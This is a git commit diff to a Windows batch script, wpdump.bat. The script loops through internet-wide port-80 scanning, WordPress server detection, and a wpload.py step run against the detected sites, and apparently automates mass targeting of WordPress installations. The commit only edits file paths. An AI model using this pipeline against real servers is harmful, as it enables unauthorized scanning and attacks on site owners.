effea60935030d7331ce35b5c771c7e7dfecfefc
Eyezik <eyezikbra@gmail.com>
2022-04-12 11:44:44 -0700

    Update wpdump.bat

--- wpdump.bat
+++ wpdump.bat
@@ -9,11 +9,11 @@ color 0f
 
 cd C:\Python27amd64
 python.exe zmap.py 80 200
-cd C:\Users\root\AppData\Local\Programs\Python\Python39\
+cd C:\Users\AppData\Local\Programs\Python\Python39\
 python.exe wpdetect.py C:\Python27amd64\list.txt
 echo _________________
 type WP_SERVERS.txt
 echo _________________
 cd C:\Python27amd64
-python.exe wpload.py C:\Users\root\AppData\Local\Programs\Python\Python39\wp.txt
+python.exe wpload.py C:\Users\wp.txt
 goto loop
